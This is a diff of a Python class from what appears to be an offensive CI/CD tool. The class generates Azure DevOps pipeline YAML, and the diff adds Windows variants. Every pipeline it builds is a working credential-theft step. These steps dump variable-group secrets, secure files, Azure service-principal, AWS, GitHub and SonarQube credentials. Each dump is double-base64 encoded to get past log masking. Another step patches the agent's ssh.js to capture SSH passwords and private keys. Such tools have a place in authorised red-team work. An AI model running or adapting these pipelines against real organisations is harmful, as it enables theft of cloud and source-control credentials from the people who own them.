@@ -1,227 +1,247 @@
 from nordstream.yaml.generator import YamlGeneratorBase
 from nordstream.utils.constants import DEFAULT_TASK_NAME
 
-
 class DevOpsPipelineGenerator(YamlGeneratorBase):
     taskName = DEFAULT_TASK_NAME
-    _defaultTemplate = {
-        "pool": {"vmImage": "ubuntu-latest"},
-        "steps": [
-            {
+
+    def _get_base_template(self, poolName, os_type):
+        pool = {"name": poolName} if poolName else {
+            "vmImage": "windows-latest" if os_type.lower() == "windows" else "ubuntu-latest"
+        }
+        return {
+            "pool": pool,
+            "trigger": "none",
+            "steps": []
+        }
+
+    def _get_ps_b64_script(self, fetch_logic):
+        """Helper to wrap PowerShell variable fetching in Double Base64 encoding."""
+        return f"""{fetch_logic}
+if ($output) {{
+    $output = $output.TrimEnd("`n", "`r")
+    $base1 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($output))
+    $base2 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($base1))
+    Write-Host $base2
+    Write-Host ""
+}}"""
+
+    def generatePipelineForSecretExtraction(self, variableGroup, poolName=None, os="linux"):
+        self._defaultTemplate = self._get_base_template(poolName, os)
+        self._defaultTemplate["variables"] = [{"group": variableGroup.get("name")}]
+        secrets = variableGroup.get("variables", [])
+
+        if os == "windows":
+            secretVars = ""
+            for sec in secrets:
+                key = f"secret_{sec}"
+                value = f"$({sec})"
+                secretVars += f"'{key}'=\"{value}\"\n"
+            
+            fetch_logic = f"""$secret_vars = @{{
+{secretVars}
+}}
+
+$output = ""
+$secret_vars.GetEnumerator() | ForEach-Object {{
+    $output += "$($_.Key)=$($_.Value)`n" 
+}}"""
+
+            self._defaultTemplate["steps"].append({
+                "task": "PowerShell@2",
+                "displayName": self.taskName,
+                "inputs": {
+                    "targetType": "inline",
+                    "script": self._get_ps_b64_script(fetch_logic)
+                }
+            })
+        else:
+            env_vars = {f"secret_{sec}": f"$({sec})" for sec in secrets}
+            self._defaultTemplate["steps"].append({
                 "task": "Bash@3",
-                "displayName": taskName,
+                "displayName": self.taskName,
                 "inputs": {
                     "targetType": "inline",
                     "script": "env -0 | awk -v RS='\\0' '/^secret_/ {print $0}' | base64 -w0 | base64 -w0 ; echo ",
                 },
-                "env": "#FIXME",
-            }
-        ],
-        "trigger": "none",
-        "variables": [{"group": "#FIXME"}],
-    }
-    _secureFileTemplate = {
-        "pool": {"vmImage": "ubuntu-latest"},
-        "trigger": "none",
-        "steps": [
-            {
-                "task": "DownloadSecureFile@1",
-                "name": "secretFile",
-                "inputs": {"secureFile": "#FIXME"},
-            },
-            {
-                "script": "cat $(secretFile.secureFilePath) | base64 -w0 | base64 -w0; echo",
-                "displayName": taskName,
-            },
-        ],
-    }
-    _serviceConnectionTemplateAzureRM = {
-        "pool": {"vmImage": "ubuntu-latest"},
-        "steps": [
-            {
-                "task": "AzureCLI@2",
-                "displayName": taskName,
+                "env": env_vars,
+            })
+
+    def generatePipelineForSecureFileExtraction(self, secureFile, poolName=None, os="linux"):
+        self._defaultTemplate = self._get_base_template(poolName, os)
+        
+        self._defaultTemplate["steps"].append({
+            "task": "DownloadSecureFile@1",
+            "name": "secretFile",
+            "inputs": {"secureFile": secureFile},
+        })
+
+        if os == "windows":
+            self._defaultTemplate["steps"].append({
+                "task": "PowerShell@2",
+                "displayName": self.taskName,
                 "inputs": {
                     "targetType": "inline",
-                    "addSpnToEnvironment": True,
-                    "scriptType": "bash",
-                    "scriptLocation": "inlineScript",
-                    "azureSubscription": "#FIXME",
-                    "inlineScript": (
-                        'sh -c "env | grep \\"^servicePrincipal\\" | base64 -w0 |' ' base64 -w0; echo  ;"'
-                    ),
-                },
-            }
-        ],
-        "trigger": "none",
-    }
-    _serviceConnectionTemplateGitHub = {
-        "pool": {"vmImage": "ubuntu-latest"},
-        "resources": {
-            "repositories": [
-                {
-                    "repository": "devRepo",
-                    "type": "github",
-                    "endpoint": "None",
-                    "name": "microsoft/azure-pipelines-tasks",
+                    "script": self._get_ps_b64_script('$output = Get-Content -Path "$(secretFile.secureFilePath)" -Raw')
                 }
-            ]
-        },
-        "steps": [
-            {"checkout": "devRepo", "persistCredentials": True},
-            {
-                "task": "Bash@3",
-                "displayName": taskName,
+            })
+        else:
+            self._defaultTemplate["steps"].append({
+                "script": "cat $(secretFile.secureFilePath) | base64 -w0 | base64 -w0; echo",
+                "displayName": self.taskName,
+            })
+
+    def generatePipelineForAzureRm(self, azureSubscription, poolName=None, os="linux"):
+        self._defaultTemplate = self._get_base_template(poolName, os)
+        
+        step = {
+            "task": "AzureCLI@2",
+            "displayName": self.taskName,
+            "inputs": {
+                "targetType": "inline",
+                "addSpnToEnvironment": True,
+                "scriptLocation": "inlineScript",
+                "azureSubscription": azureSubscription,
+            },
+        }
+
+        if os == "windows":
+            step["inputs"]["scriptType"] = "pscore"
+            step["inputs"]["inlineScript"] = self._get_ps_b64_script(
+                '$output = (Get-ChildItem Env: | Where-Object Name -match "servicePrincipal" | ForEach-Object { "$($_.Name)=$($_.Value)" }) -join "`n"'
+            )
+        else:
+            step["inputs"]["scriptType"] = "bash"
+            step["inputs"]["inlineScript"] = 'sh -c "env | grep \\"^servicePrincipal\\" | base64 -w0 | base64 -w0; echo ;"'
+            
+        self._defaultTemplate["steps"].append(step)
+
+    def generatePipelineForGitHub(self, endpoint, poolName=None, os="linux"):
+        self._defaultTemplate = self._get_base_template(poolName, os)
+        self._defaultTemplate["resources"] = {
+            "repositories": [{
+                "repository": "devRepo",
+                "type": "github",
+                "endpoint": endpoint,
+                "name": "github/g-emoji-element",
+            }]
+        }
+        
+        self._defaultTemplate["steps"].append({"checkout": "devRepo", "persistCredentials": True})
+
+        if os == "windows":
+            self._defaultTemplate["steps"].append({
+                "task": "PowerShell@2",
+                "displayName": self.taskName,
                 "inputs": {
                     "targetType": "inline",
-                    "script": 'sh -c "cat ./.git/config | base64 -w0 | base64 -w0; echo  ;"',
-                },
-            },
-        ],
-        "trigger": "none",
-    }
-
-    _serviceConnectionTemplateAWS = {
-        "pool": {"vmImage": "ubuntu-latest"},
-        "steps": [
-            {
-                "task": "AWSShellScript@1",
-                "displayName": taskName,
-                "inputs": {
-                    # "regionName": "#FIXME",
-                    "awsCredentials": "#FIXME",
-                    "scriptType": "inline",
-                    "inlineScript": (
-                        'sh -c "env | grep -E \\"(AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID)\\" | base64 -w0 |'
-                        ' base64 -w0; echo  ;"'
-                    ),
-                },
-            }
-        ],
-        "trigger": "none",
-    }
-
-    _serviceConnectionTemplateSonar = {
-        "pool": {"vmImage": "ubuntu-latest"},
-        "steps": [
-            {
-                "task": "SonarQubePrepare@6",
-                "inputs": {"SonarQube": "#FIXME", "scannerMode": "CLI", "projectKey": "sonarqube"},
-            },
-            {
+                    "script": self._get_ps_b64_script('$output = Get-Content -Path ".\\.git\\config" -Raw')
+                }
+            })
+        else:
+            self._defaultTemplate["steps"].append({
                 "task": "Bash@3",
-                "displayName": taskName,
+                "displayName": self.taskName,
+                "inputs": {
+                    "targetType": "inline",
+                    "script": 'sh -c "cat ./.git/config | base64 -w0 | base64 -w0; echo ;"',
+                },
+            })
+
+    def generatePipelineForAWS(self, awsCredentials, poolName=None, os="linux"):
+        self._defaultTemplate = self._get_base_template(poolName, os)
+
+        if os == "windows":
+            self._defaultTemplate["steps"].append({
+                "task": "AWSPowerShellModuleScript@1",
+                "displayName": self.taskName,
+                "inputs": {
+                    "awsCredentials": awsCredentials,
+                    "scriptType": "inline",
+                    "inlineScript": self._get_ps_b64_script(
+                        '$output = (Get-ChildItem Env: | Where-Object Name -match "AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID" | ForEach-Object { "$($_.Name)=$($_.Value)" }) -join "`n"'
+                    )
+                }
+            })
+        else:
+            self._defaultTemplate["steps"].append({
+                "task": "AWSShellScript@1",
+                "displayName": self.taskName,
+                "inputs": {
+                    "awsCredentials": awsCredentials,
+                    "scriptType": "inline",
+                    "inlineScript": 'sh -c "env | grep -E \\"(AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID)\\" | base64 -w0 | base64 -w0; echo ;"',
+                },
+            })
+
+    def generatePipelineForSonar(self, sonarSCName, poolName=None, os="linux"):
+        self._defaultTemplate = self._get_base_template(poolName, os)
+        self._defaultTemplate["steps"].append({
+            "task": "SonarQubePrepare@6",
+            "inputs": {"SonarQube": sonarSCName, "scannerMode": "CLI", "projectKey": "sonarqube"},
+        })
+
+        if os == "windows":
+            self._defaultTemplate["steps"].append({
+                "task": "PowerShell@2",
+                "displayName": self.taskName,
+                "inputs": {
+                    "targetType": "inline",
+                    "script": self._get_ps_b64_script(
+                        '$output = (Get-ChildItem Env: | Where-Object Name -match "SONARQUBE_SCANNER_PARAMS" | ForEach-Object { "$($_.Name)=$($_.Value)" }) -join "`n"'
+                    )
+                }
+            })
+        else:
+            self._defaultTemplate["steps"].append({
+                "task": "Bash@3",
+                "displayName": self.taskName,
                 "inputs": {
                     "targetType": "inline",
                     "script": "sh -c 'env | grep SONARQUBE_SCANNER_PARAMS | base64 -w0 | base64 -w0; echo ;'",
                 },
-            },
-        ],
-        "trigger": "none",
-    }
+            })
 
-    _serviceConnectionTemplateSSH = {
-        "trigger": "none",
-        "pool": {"vmImage": "ubuntu-latest"},
-        "steps": [
-            {"checkout": "none"},
-            {
-                "script": 'SSH_FILE=$(find /home/vsts/work/_tasks/ -name ssh.js) ; cp $SSH_FILE $SSH_FILE.bak ; sed -i \'s|const readyTimeout = getReadyTimeoutVariable();|const readyTimeout = getReadyTimeoutVariable();\\nconst fs = require("fs");var data = "";data += hostname + ":::" + port + ":::" + username + ":::" + password + ":::" + privateKey;fs.writeFile("/tmp/artefacts.tar.gz", data, (err) => {});|\' $SSH_FILE',
-                "displayName": f"Preparing {taskName}",
-            },
-            {
-                "task": "SSH@0",
-                "continueOnError": True,
-                "inputs": {"sshEndpoint": "#FIXME", "runOptions": "commands", "commands": "sleep 1"},
-            },
-            {
-                "script": "SSH_FILE=$(find /home/vsts/work/_tasks/ -name ssh.js); mv $SSH_FILE.bak $SSH_FILE ; cat /tmp/artefacts.tar.gz | base64 -w0 | base64 -w0 ; echo ''; rm /tmp/artefacts.tar.gz",
-                "displayName": taskName,
-            },
-        ],
-    }
+    def generatePipelineForSSH(self, sshSCName, poolName=None, os="linux"):
+        self._defaultTemplate = self._get_base_template(poolName, os)
+        self._defaultTemplate["steps"].append({"checkout": "none"})
 
-    _serviceConnectionTemplateSSHWindows = {
-        "trigger": "none",
-        "pool": {"vmImage": "windows-latest"},
-        "steps": [
-            {"checkout": "none"},
-            {
-                "task": "PowerShell@2",
-                "inputs": {
-                    "script": 'Get-ChildItem -Path "D:\\a\\" -Recurse -Filter "ssh.js" | ForEach-Object { $p = $_.FullName; copy $p $p+".bak"; (Get-Content -Path $p -Raw) -replace [regex]::Escape(\'const readyTimeout = getReadyTimeoutVariable();\'), \'const readyTimeout = getReadyTimeoutVariable();const fs = require("fs");var data = "";data += hostname + ":::" + port + ":::" + username + ":::" + password + ":::" + privateKey;fs.writeFile("artefacts.tar.gz", data, (err) => {});\' | Set-Content -Path $p }',
-                    "targetType": "inline",
+        if os == "windows":
+            self._defaultTemplate["steps"].extend([
+                {
+                    "task": "PowerShell@2",
+                    "continueOnError": True,
+                    "inputs": {
+                        "targetType": "inline",
+                        "script": 'Get-ChildItem -Path "D:\\a\\" -Recurse -Filter "ssh.js" | ForEach-Object { $p = $_.FullName; copy $p ($p+".bak"); (Get-Content -Path $p -Raw) -replace [regex]::Escape(\'const readyTimeout = getReadyTimeoutVariable();\'), \'const readyTimeout = getReadyTimeoutVariable();const fs = require("fs");var data = "";data += hostname + ":::" + port + ":::" + username + ":::" + password + ":::" + privateKey;fs.writeFile("artefacts.tar.gz", data, (err) => {});\' | Set-Content -Path $p }',
+                    },
                 },
-                "continueOnError": True,
-            },
-            {"task": "SSH@0", "inputs": {"sshEndpoint": "#FIXME", "runOptions": "commands", "commands": "sleep 1"}},
-            {
-                "task": "PowerShell@2",
-                "inputs": {
-                    "script": 'Get-ChildItem -Path "D:\\a\\" -Recurse -Filter "ssh.js" | ForEach-Object { $p = $_.FullName; mv -force $p+".bak" $p ;}; $encodedOnce = [Convert]::ToBase64String([IO.File]::ReadAllBytes("artefacts.tar.gz"));$encodedTwice = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($encodedOnce));echo $encodedTwice; echo \'\'; rm artefacts.tar.gz;',
-                    "targetType": "inline",
+                {
+                    "task": "SSH@0",
+                    "continueOnError": True,
+                    "inputs": {"sshEndpoint": sshSCName, "runOptions": "commands", "commands": "sleep 1"},
                 },
-                "displayName": taskName,
-            },
-        ],
-    }
-
-    def generatePipelineForSecretExtraction(self, variableGroup):
-        self.addVariableGroupToYaml(variableGroup.get("name"))
-        self.addSecretsToYaml(variableGroup.get("variables"))
-
-    def generatePipelineForSecureFileExtraction(self, secureFile):
-        self._defaultTemplate = self._secureFileTemplate
-        self.__setSecureFile(secureFile)
-
-    def generatePipelineForAzureRm(self, azureSubscription):
-        self._defaultTemplate = self._serviceConnectionTemplateAzureRM
-        self.__setAzureSubscription(azureSubscription)
-
-    def generatePipelineForGitHub(self, endpoint):
-        self._defaultTemplate = self._serviceConnectionTemplateGitHub
-        self.__setGitHubEndpoint(endpoint)
-
-    def generatePipelineForAWS(self, awsCredentials):
-        self._defaultTemplate = self._serviceConnectionTemplateAWS
-        # self.__setAWSRegion(regionName)
-        self.__setAWSCredential(awsCredentials)
-
-    def generatePipelineForSonar(self, sonarSCName):
-        self._defaultTemplate = self._serviceConnectionTemplateSonar
-        self.__setSonarServiceConnectionName(sonarSCName)
-
-    def generatePipelineForSSH(self, sshSCName):
-        self._defaultTemplate = self._serviceConnectionTemplateSSH
-        self.__setSSHServiceConnectionName(sshSCName)
-
-    def addVariableGroupToYaml(self, variableGroupName):
-        self._defaultTemplate.get("variables")[0]["group"] = variableGroupName
-
-    def addSecretsToYaml(self, secrets):
-        self._defaultTemplate.get("steps")[0]["env"] = {}
-        for sec in secrets:
-            key = f"secret_{sec}"
-            value = f"$({sec})"
-            self._defaultTemplate.get("steps")[0].get("env")[key] = value
-
-    def __setSecureFile(self, secureFile):
-        self._defaultTemplate.get("steps")[0].get("inputs")["secureFile"] = secureFile
-
-    def __setAzureSubscription(self, azureSubscription):
-        self._defaultTemplate.get("steps")[0].get("inputs")["azureSubscription"] = azureSubscription
-
-    def __setGitHubEndpoint(self, endpoint):
-        self._defaultTemplate.get("resources").get("repositories")[0]["endpoint"] = endpoint
-
-    def __setAWSRegion(self, regionName):
-        self._defaultTemplate.get("steps")[0].get("inputs")["regionName"] = regionName
-
-    def __setAWSCredential(self, awsCredentials):
-        self._defaultTemplate.get("steps")[0].get("inputs")["awsCredentials"] = awsCredentials
-
-    def __setSonarServiceConnectionName(self, scName):
-        self._defaultTemplate.get("steps")[0].get("inputs")["SonarQube"] = scName
-
-    def __setSSHServiceConnectionName(self, sshName):
-        self._defaultTemplate.get("steps")[2].get("inputs")["sshEndpoint"] = sshName
+                {
+                    "task": "PowerShell@2",
+                    "displayName": self.taskName,
+                    "inputs": {
+                        "targetType": "inline",
+                        "script": 'Get-ChildItem -Path "D:\\a\\" -Recurse -Filter "ssh.js" | ForEach-Object { $p = $_.FullName; mv -force ($p+".bak") $p ;}; $encodedOnce = [Convert]::ToBase64String([IO.File]::ReadAllBytes("artefacts.tar.gz"));$encodedTwice = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($encodedOnce));echo $encodedTwice; echo \'\'; rm artefacts.tar.gz;',
+                    },
+                },
+            ])
+        else:
+            self._defaultTemplate["steps"].extend([
+                {
+                    "script": 'SSH_FILE=$(find /home/vsts/work/_tasks/ -name ssh.js) ; cp $SSH_FILE $SSH_FILE.bak ; sed -i \'s|const readyTimeout = getReadyTimeoutVariable();|const readyTimeout = getReadyTimeoutVariable();\\nconst fs = require("fs");var data = "";data += hostname + ":::" + port + ":::" + username + ":::" + password + ":::" + privateKey;fs.writeFile("/tmp/artefacts.tar.gz", data, (err) => {});|\' $SSH_FILE',
+                    "displayName": f"Preparing {self.taskName}",
+                },
+                {
+                    "task": "SSH@0",
+                    "continueOnError": True,
+                    "inputs": {"sshEndpoint": sshSCName, "runOptions": "commands", "commands": "sleep 1"},
+                },
+                {
+                    "script": "SSH_FILE=$(find /home/vsts/work/_tasks/ -name ssh.js); mv $SSH_FILE.bak $SSH_FILE ; cat /tmp/artefacts.tar.gz | base64 -w0 | base64 -w0 ; echo ''; rm /tmp/artefacts.tar.gz",
+                    "displayName": self.taskName,
+                },
+            ])
